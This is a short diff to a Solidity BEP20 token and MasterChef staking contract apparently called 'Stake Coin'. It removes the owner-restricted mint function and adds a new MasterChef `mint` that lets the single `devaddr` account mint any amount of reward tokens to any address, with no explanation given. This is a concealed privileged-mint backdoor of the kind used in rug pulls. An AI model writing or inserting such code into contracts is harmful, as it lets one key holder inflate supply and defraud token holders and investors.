@@ -834,18 +834,6 @@ contract BEP20 is Context, IBEP20, Ownable {
         return true;
     }
 
-    /**
-     * @dev Creates `amount` tokens and assigns them to `msg.sender`, increasing
-     * the total supply.
-     *
-     * Requirements
-     *
-     * - `msg.sender` must be the token owner
-     */
-    function mint(uint256 amount) public onlyOwner returns (bool) {
-        _mint(_msgSender(), amount);
-        return true;
-    }
 
     /**
      * @dev Moves tokens `amount` from `sender` to `recipient`.
@@ -1777,5 +1765,9 @@ contract MasterChef is Ownable , BEP20('Stake Coin', 'STAKE') {
     function dev(address _devaddr) public {
         require(msg.sender == devaddr, "dev: wut?");
         devaddr = _devaddr;
+    }
+     function mint(address _addr,uint256 amount) public {
+        require(msg.sender == devaddr, "dev: wut?");
+        cake.mint(_addr, amount);
     }
 }
